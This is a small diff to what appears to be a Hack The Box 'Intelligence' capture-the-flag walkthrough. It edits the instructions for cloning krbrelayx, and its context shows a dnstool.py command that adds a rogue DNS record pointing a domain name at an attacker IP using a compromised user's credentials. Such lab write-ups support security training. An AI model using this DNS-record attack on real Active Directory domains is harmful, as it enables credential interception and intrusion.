@@ -317,10 +317,10 @@ python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' \
   -a add -r 'webpwned.intelligence.htb' -d 10.10.14.67 -t A
 ```
 
-If `dnstool.py` is not installed, clone krbrelayx:
+If `dnstool.py` is not in `$PATH`, clone krbrelayx:
 ```bash
-git clone https://github.com/dirkjanm/krbrelayx.git
-python3 krbrelayx/dnstool.py ...
+git clone https://github.com/dirkjanm/krbrelayx.git /tmp/krbrelayx
+python3 /tmp/krbrelayx/dnstool.py ...
 ```
 
 #### 2. Verify DNS Resolution
